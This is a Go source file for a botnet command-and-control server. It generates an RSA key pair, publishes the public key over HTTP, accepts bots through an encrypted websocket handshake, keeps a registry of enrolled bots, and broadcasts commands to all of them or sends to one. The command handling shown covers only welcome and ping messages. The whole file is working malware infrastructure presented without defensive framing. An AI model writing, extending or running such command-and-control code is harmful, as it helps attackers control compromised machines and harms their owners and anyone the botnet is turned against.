package ccserver

import (
	"crypto/rsa"
	"encoding/json"
	"log"
	"net/http"

	"github.com/adrianosela/botnet/command-and-control/ccworker"
	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"
)

// CommandAndControl is the command and control - controller
type CommandAndControl struct {
	msgDecryptKey *rsa.PrivateKey
	msgEncryptKey string
	bots          map[string]*ccworker.BotWorker
	// for inbound decrypted bot messages to be handled one-by-one
	recvMsgChan chan *protocol.Message
}

// NewCommandAndControl is the constructor for a CommandAndControl
func NewCommandAndControl() (*CommandAndControl, error) {
	log.Println("[cmd&ctrl] generating command and control public key...")
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[cmd&ctrl] command and control public key: \n%s", string(pub))
	return &CommandAndControl{
		msgDecryptKey: priv,
		msgEncryptKey: string(pub),
		bots:          make(map[string]*ccworker.BotWorker),
		recvMsgChan:   make(chan *protocol.Message),
	}, nil
}

// StartBotnet begins botnet communication
func (cc *CommandAndControl) StartBotnet() {
	for {
		select {
		case msg := <-cc.recvMsgChan:
			cc.HandleBotMessage(msg)
		}
	}
}

// EnrolBot registers a bot to the botnet
func (cc *CommandAndControl) EnrolBot(bot *ccworker.BotWorker) {
	cc.bots[bot.ID] = bot
	bot.Start()
	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
	// let bot know enrolment succeeded
	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
	log.Printf("[cmd&ctrl] pinging bot %s...", bot.ID)
	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypePing}
}

// ReleaseBot de registers a bot from a botnet
func (cc *CommandAndControl) ReleaseBot(id string) {
	if bot, ok := cc.bots[id]; ok {
		delete(cc.bots, id)
		close(bot.CommandChan)
	}
	log.Printf("[cmd&ctrl] bot %s left net", id)
}

// HandleBotMessage handles a single given message
func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
	switch msg.Type {
	case protocol.MessageTypePong:
		log.Printf("[pong] %v", msg)
		return
	default:
		log.Printf("received message of unhandled type: %v", msg)
		return
	}
}

// BroadcastCommand broadcasts a command to all bots
func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
	for botID := range cc.bots {
		cc.SendCommandToBot(cmd, botID)
	}
}

// SendCommandToBot sends a command to only one given bot
func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
	select {
	case cc.bots[id].CommandChan <- cmd:
	default:
		cc.ReleaseBot(id)
	}
}

// KeyHTTPHandler serves the CC server's public key
func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.msgEncryptKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return command and control discovery struct"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(ccDiscoveryBytes)
	return
}

// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
	// upgrade protocol to websockets connection
	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not upgrade to WS connection"))
		return
	}
	// receive public key from bot handshake
	botPubKey, err := protocol.BotHandshake(conn, cc.msgDecryptKey)
	if err != nil {
		log.Printf("received join request but failed to complete net handshake: %s", err)
		return
	}
	// create new bot bontroller
	botController, err := ccworker.NewBotWorker(cc.msgDecryptKey, botPubKey, conn, cc.recvMsgChan)
	if err != nil {
		log.Printf("could not create new slave controller for new slave: %s", err)
		return
	}
	// add to net and start socket handlers
	cc.EnrolBot(botController)
}
